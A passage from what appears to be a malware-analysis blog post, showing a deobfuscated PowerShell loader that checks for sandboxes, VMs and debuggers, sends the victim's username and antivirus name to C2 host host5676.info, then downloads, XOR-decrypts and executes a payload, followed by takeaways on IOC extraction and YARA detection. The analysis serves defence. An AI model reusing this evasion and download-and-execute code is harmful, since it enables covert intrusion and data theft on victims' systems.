    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$ramMB</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsLowDisk</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="p">[</span><span class="n">UInt64</span><span class="p">]</span><span class="nv">$totalBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="n">rOQcgNZuUHOSIIzxCh</span><span class="p">]::</span><span class="n">GetDiskFreeSpaceExA</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,[</span><span class="n">ref</span><span class="p">]</span><span class="nx">0</span><span class="p">,[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$totalBytes</span><span class="p">,[</span><span class="n">ref</span><span class="p">]</span><span class="nx">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$false</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="nv">$totalMB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">](</span><span class="nv">$totalBytes</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">1024</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">1024</span><span class="p">)</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$totalMB</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10240</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsSandboxProcessRunning</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$targets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
        </span><span class="s1">'ollydbg.exe'</span><span class="p">,</span><span class="s1">'processhacker.exe'</span><span class="p">,</span><span class="s1">'immunitydebugger.exe'</span><span class="p">,</span><span class="s1">'wireshark.exe'</span><span class="p">,</span><span class="s1">'dumpcap.exe'</span><span class="p">,</span><span class="w">
        </span><span class="s1">'hookexplorer.exe'</span><span class="p">,</span><span class="s1">'petools.exe'</span><span class="p">,</span><span class="s1">'lordpe.exe'</span><span class="p">,</span><span class="s1">'proc_analyzer.exe'</span><span class="p">,</span><span class="s1">'sysanalyzer.exe'</span><span class="p">,</span><span class="w">
        </span><span class="s1">'sniff_hit.exe'</span><span class="p">,</span><span class="s1">'windbg.exe'</span><span class="p">,</span><span class="s1">'joeboxcontrol.exe'</span><span class="p">,</span><span class="s1">'joeboxserver.exe'</span><span class="p">,</span><span class="s1">'resourcehacker.exe'</span><span class="p">,</span><span class="w">
        </span><span class="s1">'x32dbg.exe'</span><span class="p">,</span><span class="s1">'x64dbg.exe'</span><span class="p">,</span><span class="s1">'httpdebugger.exe'</span><span class="p">,</span><span class="s1">'qemu-ga.exe'</span><span class="p">,</span><span class="s1">'vboxservice.exe'</span><span class="p">,</span><span class="s1">'vboxtray.exe'</span><span class="p">,</span><span class="w">
        </span><span class="s1">'vmsrvc.exe'</span><span class="p">,</span><span class="s1">'vmusrvc.exe'</span><span class="p">,</span><span class="s1">'vmtoolsd.exe'</span><span class="p">,</span><span class="s1">'vmwaretray.exe'</span><span class="p">,</span><span class="s1">'vmwareuser.exe'</span><span class="p">,</span><span class="w">
        </span><span class="s1">'vgauthservice.exe'</span><span class="p">,</span><span class="s1">'vmacthlp.exe'</span><span class="p">,</span><span class="s1">'xenservice.exe'</span><span class="w">
    </span><span class="p">)</span><span class="w">
    </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$targets</span><span class="w"> </span><span class="o">-contains</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="o">.</span><span class="nf">ToLower</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsSuspiciousHostname</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$hostnames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
        </span><span class="s2">"SANDBOX"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"7SILVIA"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"HANSPETER-PC"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"JOHN-PC"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"MUELLER-PC"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"WIN7-TRAPS"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"FORTINET"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"TEQUILABOOMBOOM"</span><span class="w">
    </span><span class="p">)</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$hostnames</span><span class="w"> </span><span class="o">-contains</span><span class="w"> </span><span class="p">([</span><span class="n">System.Net.Dns</span><span class="p">]::</span><span class="n">GetHostName</span><span class="p">())</span><span class="o">.</span><span class="nf">ToUpper</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsVmVendor</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$serial</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_BIOS</span><span class="p">)</span><span class="o">.</span><span class="nf">SerialNumber</span><span class="w">
    </span><span class="nx">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$serial</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="nv">$vendors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s2">"QEMU"</span><span class="p">,</span><span class="w"> </span><span class="s2">"VIRTUALBOX"</span><span class="p">,</span><span class="w"> </span><span class="s2">"VMWARE"</span><span class="p">)</span><span class="w">
    </span><span class="nv">$sysManu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">string</span><span class="p">](</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_ComputerSystem</span><span class="p">)</span><span class="o">.</span><span class="nf">Manufacturer</span><span class="p">)</span><span class="o">.</span><span class="nf">ToUpper</span><span class="p">()</span><span class="w">
    </span><span class="nv">$sysModel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">string</span><span class="p">](</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_ComputerSystem</span><span class="p">)</span><span class="o">.</span><span class="nf">Model</span><span class="p">)</span><span class="o">.</span><span class="nf">ToUpper</span><span class="p">()</span><span class="w">
    </span><span class="nv">$biosVer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">string</span><span class="p">](</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_BIOS</span><span class="p">)</span><span class="o">.</span><span class="nf">SMBIOSBIOSVersion</span><span class="p">)</span><span class="o">.</span><span class="nf">ToUpper</span><span class="p">()</span><span class="w">
    </span><span class="nv">$boardManu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">string</span><span class="p">](</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_BaseBoard</span><span class="p">)</span><span class="o">.</span><span class="nf">Manufacturer</span><span class="p">)</span><span class="o">.</span><span class="nf">ToUpper</span><span class="p">()</span><span class="w">
    </span><span class="nv">$boardProd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">string</span><span class="p">](</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_BaseBoard</span><span class="p">)</span><span class="o">.</span><span class="nf">Product</span><span class="p">)</span><span class="o">.</span><span class="nf">ToUpper</span><span class="p">()</span><span class="w">
    </span><span class="nx">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$v</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$vendors</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$sysManu</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$sysModel</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$biosVer</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$boardManu</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$boardProd</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsCleanEnvironment</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="w">
        </span><span class="p">(</span><span class="n">Is32BitOrOldWindows</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsRecentlyStarted</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsLowRAM</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsLowDisk</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsSandboxProcessRunning</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsSuspiciousHostname</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w">
        </span><span class="p">(</span><span class="n">IsVmVendor</span><span class="p">)</span><span class="w">
    </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="kr">return</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="n">Write-Output</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">XorDecrypt</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">param</span><span class="w"> </span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$data</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$key</span><span class="p">)</span><span class="w">
    </span><span class="kr">while</span><span class="w"> </span><span class="p">(</span><span class="nv">$key</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$data</span><span class="o">.</span><span class="nf">Length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$key</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">$key</span><span class="o">.</span><span class="nf">Substring</span><span class="p">(</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">math</span><span class="p">]::</span><span class="nx">min</span><span class="p">(</span><span class="nv">$key</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="nv">$data</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">$key</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="nv">$keyBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="w">
    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]::</span><span class="n">new</span><span class="p">(</span><span class="nv">$data</span><span class="o">.</span><span class="nf">Length</span><span class="p">)</span><span class="w">
    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$data</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$result</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$data</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="nv">$keyBytes</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$result</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">ExfiltrateAndLoadPayload</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Security.Principal.WindowsIdentity</span><span class="p">]::</span><span class="n">GetCurrent</span><span class="p">()</span><span class="o">.</span><span class="nf">Name</span><span class="w">
    </span><span class="nv">$encodedUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Uri</span><span class="p">]::</span><span class="n">EscapeUriString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII.GetBytes</span><span class="p">(</span><span class="nv">$username</span><span class="p">)))</span><span class="w">
    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">DRLGJTjyWALFmvoywkxE</span><span class="w">
        </span><span class="nv">$isAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_GroupUser</span><span class="w"> </span><span class="o">|</span><span class="w">
            </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="p">([</span><span class="n">wmi</span><span class="p">]</span><span class="bp">$_</span><span class="o">.</span><span class="nf">GroupComponent</span><span class="p">)</span><span class="o">.</span><span class="nf">SID</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"S-1-5-32-544"</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$false</span><span class="w"> </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
            </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">wmi</span><span class="p">]</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PartComponent</span><span class="p">)</span><span class="o">.</span><span class="nf">Caption</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$null</span><span class="w"> </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
            </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$username</span><span class="w"> </span><span class="p">}</span><span class="w">
        </span><span class="nv">$isAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$isAdmin</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$null</span><span class="p">)</span><span class="w">
        </span><span class="nv">$avDisplayName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="w">
        </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nv">$avDisplayName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="s2">"root\SecurityCenter2"</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">AntivirusProduct</span><span class="p">)</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w">
        </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
        </span><span class="nv">$encodedAV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Uri</span><span class="p">]::</span><span class="n">EscapeUriString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII.GetBytes</span><span class="p">((</span><span class="nv">$avDisplayName</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s2">""</span><span class="p">)[</span><span class="mi">0</span><span class="o">..</span><span class="mi">200</span><span class="p">]</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s2">""</span><span class="p">)))</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$username</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="nv">$isAdmin</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">IsCleanEnvironment</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="p">[</span><span class="n">Net.ServicePointManager</span><span class="p">]::</span><span class="n">ServerCertificateValidationCallback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
            </span><span class="nv">$wc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
            </span><span class="nv">$url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://host5676.info:14755/b_</span><span class="nv">${encodedUser}</span><span class="se">`_</span><span class="nv">${encodedAV}</span><span class="s2">"</span><span class="w">
            </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nv">$wc</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
            </span><span class="nv">$payloadUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://dlhost5676.info:14755/tt_b"</span><span class="w">
            </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nv">$b64Payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$wc</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="nv">$payloadUrl</span><span class="p">)</span><span class="w">
                </span><span class="nv">$xorKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SomeKeyString"</span><span class="w">  </span><span class="c"># (Replace with actual key as decoded)</span><span class="w">
                </span><span class="nv">$decryptedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XorDecrypt</span><span class="w"> </span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$b64Payload</span><span class="p">))</span><span class="w"> </span><span class="nv">$xorKey</span><span class="w">
                </span><span class="nv">$payloadCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII.GetString</span><span class="p">(</span><span class="nv">$decryptedBytes</span><span class="p">)</span><span class="w">
                </span><span class="n">Invoke-Expression</span><span class="w"> </span><span class="nv">$payloadCode</span><span class="w">
            </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
        </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nv">$wc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
            </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nv">$fallbackUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://host5676.info:14755/fallback"</span><span class="w">
                </span><span class="nv">$wc</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="nv">$fallbackUrl</span><span class="p">)</span><span class="w">
            </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$psVersion</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$PSVersionTable</span><span class="o">.</span><span class="nf">PSVersion</span><span class="w">
        </span><span class="nv">$arch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Size</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">8</span><span class="w">
        </span><span class="nv">$msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="nv">$psVersion</span><span class="o">.</span><span class="nf">Major</span><span class="si">)</span><span class="s2">.</span><span class="si">$(</span><span class="nv">$psVersion</span><span class="o">.</span><span class="nf">Minor</span><span class="si">)</span><span class="s2">.</span><span class="nv">$arch</span><span class="s2">:"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII.GetBytes</span><span class="p">((</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="p">)))</span><span class="w">
        </span><span class="nv">$wc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
        </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nv">$errorUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://host5676.info:14755/error"</span><span class="w">
            </span><span class="nv">$wc</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="nv">$errorUrl</span><span class="p">)</span><span class="w">
        </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">ExfiltrateAndLoadPayload</span><span class="w">
</span></code></pre></div></div> <hr> <h2 id="8-key-takeaways--lessons-learned">8. Key Takeaways &amp; Lessons Learned</h2> <ul> <li> <strong>Obfuscation</strong>: Most obfuscation in the wild is about hiding strings and function names. If you can decode them, you can reconstruct almost any script.</li> <li> <strong>Scripting Automation</strong>: For large scripts, use scripting to automate string decoding.</li> <li> <strong>Anti-Analysis Tricks</strong>: Memory, disk, hostname, and process checks are standard for evasion.</li> <li> <strong>Pattern Recognition</strong>: After a few of these, you’ll spot common obfuscation and evasion patterns immediately.</li> <li> <strong>IOC Extraction</strong>: Deobfuscation enables you to extract critical Indicators of Compromise (IOCs), such as: <ul> <li>C2 server domains/URLs (e.g., <code class="language-plaintext highlighter-rouge">host5676.info</code>, <code class="language-plaintext highlighter-rouge">dlhost5676.info</code>)</li> <li>Unique payload URLs and exfiltration endpoints</li> <li>Custom XOR keys and decryption methods</li> <li>Hardcoded process or hostname lists used for evasion (can be YARA/IOC material)</li> </ul> </li> <li> <strong>Documentation</strong>: Always document decoded strings, extracted endpoints, and unique behaviors for threat intelligence sharing.</li> <li> <strong>Sharing</strong>: Sharing IOCs and deobfuscated code with the community helps everyone defend faster.</li> <li> <strong>YARA Detection</strong>: There is a public YARA rule by Florian Roth (Nextron Systems) that reliably detects this obfuscation and reverse shell technique in the wild. <ul> <li>See: <a href="https://valhalla.nextron-systems.com/info/rule/HKTL_ReverseTCPShell_Dec19" rel="external nofollow noopener" target="_blank">HKTL_ReverseTCPShell_Dec19 (valhalla.nextron-systems.com)</a> </li> </ul> </li> </ul> </div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Manuel Boll. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a>. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Made with ❤️ and Mate. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer 